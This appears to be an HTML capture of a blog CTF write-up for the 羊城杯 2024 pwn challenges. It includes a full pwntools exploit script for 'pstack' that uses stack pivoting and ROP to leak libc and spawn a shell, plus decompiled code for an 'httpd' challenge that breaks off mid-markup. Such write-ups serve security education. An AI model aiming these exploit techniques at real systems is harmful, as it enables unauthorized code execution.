@@ -1,0 +1,1892 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+    
+
+<!-- keywords -->
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="nyyyddddn">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="nyyyddddn">
+    
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="pstack程序逻辑非常简单，存在栈溢出只能覆盖返回地址，没有pie，通过二次栈迁移，控制rbp来实现任意地址写，然后第一次栈迁移往bss写满泄露地址的rop，之后二次迁移过去执行就可以执行rop，第一次rop泄露地址，第二次rop直接getshell 1234567891011121314151617181920212223242526272829303132333435363738394041">
+<meta property="og:type" content="article">
+<meta property="og:title" content="羊城杯2024pwn">
+<meta property="og:url" content="https://nyyyddddn.github.io/2024/09/04/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024pwn/index.html">
+<meta property="og:site_name" content="nyyyddddn">
+<meta property="og:description" content="pstack程序逻辑非常简单，存在栈溢出只能覆盖返回地址，没有pie，通过二次栈迁移，控制rbp来实现任意地址写，然后第一次栈迁移往bss写满泄露地址的rop，之后二次迁移过去执行就可以执行rop，第一次rop泄露地址，第二次rop直接getshell 1234567891011121314151617181920212223242526272829303132333435363738394041">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-09-04T11:43:24.000Z">
+<meta property="article:modified_time" content="2024-09-04T11:47:16.278Z">
+<meta property="article:author" content="nyyyddddn">
+<meta property="article:tag" content="ctf writeup">
+<meta name="twitter:card" content="summary">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/null">
+    
+    <title>羊城杯2024pwn · nyyyddddn&#39;s blog</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20211217" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="/css/dark.css?v=20211217" as="style">
+    <link rel="stylesheet" href="/css/dark.css">
+    <link rel="stylesheet" href="/css/mobile.css?v=20211217" media="(max-width: 960px)">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js?v=20211217" as="script">
+    <link rel="preload" href="/scripts/dark.js?v=20211217" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+    
+        <body class="post-body">
+    
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+            <div class="header-sidebar-menu">
+        
+            
+                <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href=/>nyyyddddn</a>
+        </span>
+    </div>
+    <!-- toggle banner for post layout -->
+    
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">nyyyddddn</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">羊城杯2024pwn</a>
+            </div>
+        </div>
+    
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+            <div class="back-top back-top-hidden">
+        
+        
+            <div>&#xe639;</div>
+        
+        </div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="
+
+
+
+
+
+
+
+    height:50vh;
+
+">
+    
+    <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
+    
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+                羊城杯2024pwn
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+                
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="ctf writeup">ctf writeup</a>
+    
+</div>
+
+                
+                <!-- 文章字数统计 -->
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2024/09/04</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="pstack"><a href="#pstack" class="headerlink" title="pstack"></a>pstack</h2><p>程序逻辑非常简单，存在栈溢出只能覆盖返回地址，没有pie，通过二次栈迁移，控制rbp来实现任意地址写，然后第一次栈迁移往bss写满泄露地址的rop，之后二次迁移过去执行就可以执行rop，第一次rop泄露地址，第二次rop直接getshell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">0</span></span><br><span class="line">IP = <span class="string">&quot;139.155.126.78&quot;</span></span><br><span class="line">PORT = <span class="number">32922</span></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">    <span class="keyword">return</span> remote(IP, PORT) <span class="keyword">if</span> <span class="keyword">not</span> is_debug <span class="keyword">else</span> process()</span><br><span class="line"></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">r = <span class="keyword">lambda</span> x=<span class="literal">None</span>: p.recv() <span class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">p = connect()</span><br><span class="line"></span><br><span class="line">rdi=<span class="number">0x0000000000400773</span></span><br><span class="line">rbp=<span class="number">0x00000000004005b0</span></span><br><span class="line">leave_ret=<span class="number">0x4006DB</span></span><br><span class="line">ret=<span class="number">0x4006DC</span></span><br><span class="line">vuln=<span class="number">0x4006C4</span></span><br><span class="line"></span><br><span class="line">payload = flat([</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x30</span>,<span class="number">0x601730</span>,vuln</span><br><span class="line">])</span><br><span class="line">sa(<span class="string">&quot;Can you grasp this little bit of overflow?&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = flat([</span><br><span class="line">    rdi,elf.got[<span class="string">&#x27;read&#x27;</span>],elf.plt[<span class="string">&#x27;puts&#x27;</span>],</span><br><span class="line">    rbp,<span class="number">0x601a30</span>,vuln,</span><br><span class="line">    <span class="number">0x6016f8</span>,leave_ret</span><br><span class="line">])</span><br><span class="line">s(payload)</span><br><span class="line">rl()</span><br><span class="line">libc_base = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) -libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = flat([</span><br><span class="line">    rdi,binsh,system,<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span>,</span><br><span class="line">    <span class="number">0x6019f8</span>,leave_ret</span><br><span class="line">])</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="httpd"><a href="#httpd" class="headerlink" title="httpd"></a>httpd</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><span class="line">// bad sp value at call has been detected, the output may be wrong!</span><br><span class="line"><span class="built_in">int</span> __cdecl main(<span class="built_in">int</span> argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> v3; // eax</span><br><span class="line">  <span class="built_in">int</span> v4; // eax</span><br><span class="line">  <span class="built_in">int</span> result; // eax</span><br><span class="line">  <span class="built_in">int</span> v6; // eax</span><br><span class="line">  <span class="built_in">int</span> v7; // eax</span><br><span class="line">  struct tm *v8; // eax</span><br><span class="line">  __time_t tv_sec; // edi</span><br><span class="line">  <span class="built_in">int</span> st_size; // esi</span><br><span class="line">  const char *v11; // eax</span><br><span class="line">  struct dirent **namelist; // [esp+8h] [ebp-14134h] BYREF</span><br><span class="line">  <span class="built_in">int</span> v13; // [esp+Ch] [ebp-14130h] BYREF</span><br><span class="line">  <span class="built_in">int</span> v14; // [esp+10h] [ebp-1412Ch] BYREF</span><br><span class="line">  <span class="built_in">int</span> v15; // [esp+14h] [ebp-14128h] BYREF</span><br><span class="line">  <span class="built_in">int</span> v16; // [esp+18h] [ebp-14124h] BYREF</span><br><span class="line">  char v17; // [esp+1Ch] [ebp-14120h] BYREF</span><br><span class="line">  char *haystack; // [esp+20h] [ebp-1411Ch]</span><br><span class="line">  <span class="built_in">int</span> i; // [esp+24h] [ebp-14118h]</span><br><span class="line">  size_t v20; // [esp+28h] [ebp-14114h]</span><br><span class="line">  char *has_host; // [esp+2Ch] [ebp-<span class="number">141</span>10h]</span><br><span class="line">  char *v22; // [esp+30h] [ebp-<span class="number">14</span>10Ch]</span><br><span class="line">  <span class="built_in">int</span> stdout_fd; // [esp+34h] [ebp-<span class="number">14</span>108h]</span><br><span class="line">  <span class="built_in">int</span> v24; // [esp+38h] [ebp-<span class="number">14</span>104h]</span><br><span class="line">  FILE *stream; // [esp+3Ch] [ebp-<span class="number">14</span>100h]</span><br><span class="line">  <span class="built_in">int</span> v26; // [esp+40h] [ebp-140FCh]</span><br><span class="line">  FILE *v27; // [esp+44h] [ebp-140F8h]</span><br><span class="line">  <span class="built_in">int</span> c; // [esp+48h] [ebp-140F4h]</span><br><span class="line">  struct stat v29; // [esp+4Ch] [ebp-140F0h] BYREF</span><br><span class="line">  char modes[<span class="number">2</span>]; // [esp+A6h] [ebp-14096h] BYREF</span><br><span class="line">  char v31[<span class="number">16</span>]; // [esp+A8h] [ebp-14094h] BYREF</span><br><span class="line">  char v32[<span class="number">116</span>]; // [esp+B8h] [ebp-14084h] BYREF</span><br><span class="line">  char v33[<span class="number">1908</span>]; // [esp+12Ch] [ebp-<span class="number">140</span>10h] BYREF</span><br><span class="line">  char input_data[<span class="number">10000</span>]; // [esp+8A0h] [ebp-1389Ch] BYREF</span><br><span class="line">  char httpMethod[<span class="number">10000</span>]; // [esp+2FB0h] [ebp-1118Ch] BYREF</span><br><span class="line">  char requestPath; // [esp+56C0h] [ebp-EA7Ch] BYREF</span><br><span class="line">  char v37[<span class="number">9999</span>]; // [esp+56C1h] [ebp-EA7Bh] BYREF</span><br><span class="line">  char httpVersion[<span class="number">10000</span>]; // [esp+7DD0h] [ebp-C36Ch] BYREF</span><br><span class="line">  char file[<span class="number">20000</span>]; // [esp+A4E0h] [ebp-9C5Ch] BYREF</span><br><span class="line">  char v40[<span class="number">15588</span>]; // [esp+F300h] [ebp-4E3Ch] BYREF</span><br><span class="line">  __int64 v41; // [esp+12FE4h] [ebp-1158h]</span><br><span class="line">  char *v42; // [esp+12FECh] [ebp-1150h]</span><br><span class="line">  <span class="built_in">int</span> v43; // [esp+1312Ch] [ebp-<span class="number">10</span>10h] BYREF</span><br><span class="line">  unsigned <span class="built_in">int</span> v44; // [esp+14120h] [ebp-1Ch]</span><br><span class="line">  <span class="built_in">int</span> *p_argc; // [esp+1412Ch] [ebp-10h]</span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  <span class="keyword">while</span> ( &amp;v43 != (<span class="built_in">int</span> *)v33 )</span><br><span class="line">    ;</span><br><span class="line">  v44 = __readgsdword(0x14u);</span><br><span class="line">  memset(&amp;v33[<span class="number">884</span>], <span class="number">0</span>, <span class="number">1024</span>);</span><br><span class="line">  v20 = <span class="number">0</span>;</span><br><span class="line">  strcpy(modes, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( chdir(<span class="string">&quot;/home/ctf/html&quot;</span>) &lt; <span class="number">0</span> )</span><br><span class="line">    puts_error(<span class="number">500</span>, (<span class="built_in">int</span>)<span class="string">&quot;Internal Error&quot;</span>, <span class="number">0</span>, <span class="string">&quot;Config error - couldn&#x27;t chdir().&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !fgets(input_data, <span class="number">10000</span>, stdin) )</span><br><span class="line">    puts_error(<span class="number">400</span>, (<span class="built_in">int</span>)<span class="string">&quot;Bad Request&quot;</span>, <span class="number">0</span>, <span class="string">&quot;No request found.&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( __isoc99_sscanf(input_data, <span class="string">&quot;%[^ ] %[^ ] %[^ ]&quot;</span>, httpMethod, &amp;requestPath, httpVersion) != <span class="number">3</span> )</span><br><span class="line">    puts_error(<span class="number">400</span>, (<span class="built_in">int</span>)<span class="string">&quot;Bad Request&quot;</span>, <span class="number">0</span>, <span class="string">&quot;Can&#x27;t parse request.&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !fgets(input_data, <span class="number">10000</span>, stdin) )</span><br><span class="line">    puts_error(<span class="number">400</span>, (<span class="built_in">int</span>)<span class="string">&quot;Bad Request&quot;</span>, <span class="number">0</span>, <span class="string">&quot;Missing Host.&quot;</span>);</span><br><span class="line">  has_host = strstr(input_data, <span class="string">&quot;Host: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !has_host )</span><br><span class="line">    puts_error(<span class="number">400</span>, (<span class="built_in">int</span>)<span class="string">&quot;Bad Request&quot;</span>, <span class="number">0</span>, <span class="string">&quot;Missing Host.&quot;</span>);</span><br><span class="line">  v22 = strstr(has_host + <span class="number">6</span>, <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v22 )</span><br><span class="line">  &#123;</span><br><span class="line">    *v22 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v22 = strchr(has_host + <span class="number">6</span>, (<span 